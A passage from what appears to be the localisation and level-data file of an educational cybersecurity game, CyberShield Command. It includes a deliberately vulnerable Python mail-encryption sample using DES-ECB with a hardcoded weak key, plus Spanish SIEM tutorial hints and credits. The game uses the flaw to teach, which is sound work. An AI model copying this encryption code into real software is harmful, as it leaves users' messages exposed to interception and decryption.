ENCRYPTION_KEY = b"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01"

def encrypt_message(message):
    """
    Encrypts email messages for secure transmission.
    Uses DES for legacy system compatibility.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    # Message padding to multiples of 8 bytes
    padded_message = message + (8 - len(message) % 8) * ' '
    
    encrypted = cipher.encrypt(padded_message.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_message(encrypted_message):
    """
    Decrypts received email messages.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    decoded = base64.b64decode(encrypted_message)
    decrypted = cipher.decrypt(decoded)
    
    return decrypted.decode().strip()

def send_secure_email(recipient, subject, body):
    """
    Sends an encrypted email.
    """
    encrypted_body = encrypt_message(body)
    # ... rest of sending logic
    pass

# Server initialization
if __name__ == "__main__":
    print("Mail Server started with encryption", ENCRYPTION_ALGORITHM)
    print("Key configured: [REDACTED]")
`
      },
      debrief: {
        win: "VULNERABILITY FIXED: DES Weak Keys\n\nDES (Data Encryption Standard) is an obsolete encryption algorithm with 56-bit keys, easily broken by modern brute-force attacks.\n\nDES \"Weak Keys\" are 4 special keys (like 0x0101010101010101) that produce identical subkeys during encryption. This means:\n• Encrypting twice equals decrypting\n• Attackers can predict cryptographic patterns\n• Man-in-the-Middle attacks become trivial\n\nYou replaced DES with AES-256, a modern algorithm with 256-bit keys, making the system secure against these attacks.",
        loss: "Mission Failed. The cryptographic vulnerability was not fixed in time. Attackers exploited DES weak keys to intercept and decrypt email server communications."
      }
    },
    // Tutorial
    tutorial: {
      title: "TUTORIAL - Panel SIEM",
      subtitle: "Gestión de Información y Eventos de Seguridad",
      logStream: "FLUJO DE LOGS",
      analysis: "ANÁLISIS",
      source: "Fuente",
      severity: "Gravedad",
      threat: "Amenaza",
      message: "Mensaje",
      yes: "SÍ",
      no: "NO",
      selectLog: "Selecciona un log para analizarlo",
      analyzeBtn: "ANALIZAR AMENAZA",
      blockBtn: "BLOQUEAR IP",
      showHelp: "MOSTRAR AYUDA",
      hideHelp: "OCULTAR AYUDA",
      exit: "SALIR",
      success: "¡COMPLETADO!",
      successMsg: "¡Has completado el tutorial SIEM! Volviendo al mapa...",
      hints: {
        step0: "¡Empieza revisando tu Correo! Haz clic en el icono de Correo y lee la alerta de seguridad. ¡Ahí es donde todo comienza!",
        step1: "¡Bien! Ahora mira el Panel SIEM (panel inferior). ¡HAZ CLIC en el log rojo CRÍTICO para analizarlo en detalle!",
        step2: "¡Perfecto! Ahora usa el Navegador para buscar información. Visita \"SQL Injection Info\" para entender cómo funciona este ataque.",
        step3: "¡Bien! Abre la Terminal y escribe \"show-logs\" para ver todos los logs. ¡Encontrarás la IP sospechosa!",
        step4_attempt0: "¡Encontraste múltiples IPs en los logs! Intenta bloquear la que creas que es sospechosa. Escribe \"help\" en la Terminal para ver los comandos.",
        step4_attempt1: "CONSEJO: Intenta bloquear la IP 192.168.1.100 con el comando \"block-ip 192.168.1.100\". ¡Veamos qué pasa!",
        step4_mistake: "¿Viste? ¡Bloquear la IP equivocada hace que tu barra de vida baje! Ahora bloquea la correcta: 203.0.113.42",
        step4_correct: "El comando correcto es: \"block-ip 203.0.113.42\" - esta es la IP maliciosa que intentó Inyección SQL."
      }
    },
    // Level Map
    levelMap: {
      title: "MAPA DE NIVELES",
      back: "ATRÁS",
      stars: "estrellas",
      play: "JUGAR",
      levelInfo: {
        tutorial: { name: "Tutorial SIEM", description: "Aprende los conceptos básicos de un sistema SIEM (Security Information and Event Management) y cómo detectar amenazas." },
        level1: { name: "Fundamentos de Red", description: "Aprende los fundamentos de la seguridad de red e identifica vulnerabilidades comunes." },
        level2: { name: "Defensa de Firewall", description: "Configura y gestiona reglas de firewall para proteger tu perímetro de red." },
        level3: { name: "Protocolo de Encriptación", description: "Domina las técnicas de encriptación para asegurar la transmisión de datos sensibles." },
        level4: { name: "Detección de Intrusos", description: "Detecta y responde a intentos de acceso no autorizado en tiempo real." },
        level5: { name: "Análisis de Malware", description: "Identifica y neutraliza amenazas de software malicioso antes de que se propaguen." },
        level6: { name: "Ingeniería Social", description: "Defiéndete contra ataques de phishing e ingeniería social." },
        level7: { name: "Seguridad de Aplicaciones Web", description: "Asegura aplicaciones web contra vulnerabilidades comunes como la inyección SQL." },
        level8: { name: "Respuesta a Incidentes", description: "Coordina respuestas efectivas a brechas de seguridad e incidentes." },
        level9: { name: "Amenazas Persistentes Avanzadas", description: "Contrarresta campañas sofisticadas de ataques cibernéticos a largo plazo." }
      }
    },
    // Options
    options: {
      title: "OPCIONES",
      back: "ATRÁS",
      settings: "CONFIGURACIÓN",
      about: "ACERCA DE",
      credits: "CRÉDITOS",
      language: "Idioma",
      audio: "Audio",
      musicVolume: "Volumen de Música",
      sfxVolume: "Volumen de Efectos",
      saveSettings: "Guardar Configuración",
      saveConfirm: "¡Configuración guardada con éxito!",
      lastSaved: "Último guardado:",
      aboutTitle: "Acerca de CyberShield Command",
      aboutContent: {
        p1: "CyberShield Command es un juego serio educativo diseñado para enseñar principios de ciberseguridad a través de jugabilidad interactiva y escenarios del mundo real.",
        p2: "Navega a través de 9 niveles desafiantes, cada uno enfocado en diferentes aspectos de la ciberseguridad incluyendo seguridad de red, encriptación, detección de intrusos, análisis de malware y amenazas persistentes avanzadas.",
        p3Objective: "Objetivo:",
        p3: "Domina habilidades esenciales de ciberseguridad mientras te defiendes contra varias amenazas cibernéticas. Gana hasta 3 estrellas por nivel según tu rendimiento.",
        version: "Versión:",
        projectType: "Tipo de Proyecto:",
        projectTypeValue: "Juego Serio para Educación en Ciberseguridad",
        year: "Año:"
      },
      creditsTitle: "Créditos",
      creditsContent: {
        devTeam: "Equipo de Desarrollo",
        teamMembers: [
          { name: "Alessandro Boffolo", role: "Diseñador de Juegos y Desarrollador" },
          { name: "Nicola Balzano", role: "Desarrollador Backend" },
          { name: "Narcis Paviliuc", role: "Desarrollador Frontend" }
        ],
        gameDesign: "Diseño y Desarrollo del Juego",
        magistrale: "Magistrale - Serious Games for Cyber Security",
        specialThanks: "Agradecimientos Especiales",
        advisors: "Asesores Educativos",
        experts: "Expertos en Ciberseguridad",
        testers: "Probadores Beta",
        tech: "Tecnologías Utilizadas",
        assets: "Recursos y Materiales",
        icons: "Iconos: Unicode Emoji",
        palette: "Paleta de Colores: Tema Cibernético Personalizado",
        copyright: "© 2026 CyberShield Command. Todos los derechos reservados."
      }
    }
  }
};
